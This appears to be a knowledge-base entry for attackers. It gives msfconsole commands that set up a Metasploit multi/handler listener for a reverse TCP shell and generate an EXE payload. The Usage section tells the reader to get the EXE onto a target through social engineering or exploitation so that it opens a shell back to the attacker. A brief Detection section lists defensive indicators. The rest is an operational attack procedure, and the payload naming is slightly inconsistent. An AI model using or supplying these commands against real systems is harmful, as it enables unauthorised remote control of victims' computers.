---
type: code
language: bash
verified: true
created_at: '2023-04-06T03:56:21Z'
updated_at: '2023-05-26T00:59:28Z'
platforms:
  - Linux
tags:
  - metasploit
  - handler
  - reverse-shell
validated: true
---

# configure-metasploit-multi-handler

## Code

```bash
use exploit/multi/handler
set PAYLOAD generic/shell_reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
set ExitOnSession false
generate -o /tmp/meterpreter.exe -f exe
to_handler
```

## Description

This code snippet configures the Metasploit multi/handler module for a generic reverse TCP shell, sets connection parameters, generates an EXE payload for target delivery, and starts the listener. It is entered interactively in the msfconsole prompt to establish a C2 channel for incoming reverse connections.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| LHOST | IP address or interface to bind the listener (0.0.0.0 for all interfaces) | 0.0.0.0 |
| LPORT | Port to listen on for reverse connections | 4444 |
| /tmp/meterpreter.exe | Output path and filename for the generated EXE payload | /tmp/payload.exe |

## Usage

Paste or enter these lines sequentially in an active msfconsole session after launching with sudo. Use the generated EXE to exploit a target (e.g., via social engineering or vuln exploitation). When the target executes it, a reverse shell connects back, providing a command prompt in the handler.

## Detection

- Process monitoring for msfconsole or ruby processes with network binds.
- Network logs showing listeners on unusual ports (e.g., 4444/TCP).
- File system scans for suspicious EXEs in /tmp or unsigned binaries.
- IDS/IPS alerts on reverse TCP traffic patterns from internal hosts to attacker IPs.

## Related

- [[procedures/Setup-Metasploit-Reverse-Shell-Handler]]
- [[tools/Metasploit-Framework]]
